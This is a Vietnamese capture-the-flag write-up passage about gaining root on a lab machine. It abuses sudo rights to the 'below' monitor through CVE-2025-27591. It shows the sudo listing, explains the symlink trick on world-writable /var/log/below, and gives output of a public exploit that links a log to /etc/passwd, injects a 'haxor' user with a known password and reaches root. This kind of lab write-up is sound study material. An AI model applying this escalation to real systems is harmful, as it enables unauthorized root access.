Đi qua mấy kỹ thuật mà lần nào cũng dùng, tôi có `sudo -l`

```bash
jacob@outbound:~$ sudo -l
Matching Defaults entries for jacob on outbound:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*
```

Tìm hiểu một chút về `below`, đây là một trình theo dõi hiệu năng hệ thống (system performance monitor) như CPU, memory, IO, process, v.v...

### CVE-2025-27591

Thử tìm kiếm lỗ hổng của `below` tôi tìm thấy [CVE-2025-27591](https://nvd.nist.gov/vuln/detail/CVE-2025-27591). `Below` chạy như một hệ thống dịch vụ dưới quyền root và tạo thư mục `/var/log/below` với quyền world-writable (0777), cho phép người dùng không đặc quyền vẫn có thể thao tác vào thư mục này. Attacker có thể tạo symlink độc hại để trỏ đến các file hệ thống nhạy cảm (ví dụ `/etc/shadow`), từ đó chiếm quyền ghi file và có thể leo lên root.

Tìm kiếm Poc trên github, tôi tìm thấy phiên bản đầu tiên được up lên ở [đây](https://github.com/obamalaolu/CVE-2025-27591)

Copy nội dung file sh vào máy 

```bash
jacob@outbound:~$ nano exploit.sh
jacob@outbound:~$ chmod +x exploit.sh
jacob@outbound:~$ ./exploit.sh
[*] CVE-2025-27591 Privilege Escalation Exploit
[*] Checking sudo permissions...
[*] Backing up /etc/passwd to /tmp/passwd.bak
[*] Generating password hash...
[*] Creating malicious passwd line...
[*] Linking /var/log/below/error_root.log to /etc/passwd
[*] Triggering 'below' to write to symlinked log...
[*] Injecting malicious user into /etc/passwd
[*] Try switching to 'haxor' using password: hacked123
Password:
haxor@outbound:/home/jacob# id
uid=0(root) gid=0(root) groups=0(root)
haxor@outbound:/home/jacob# cd /root
haxor@outbound:~# ls
root.txt
haxor@outbound:~#
```




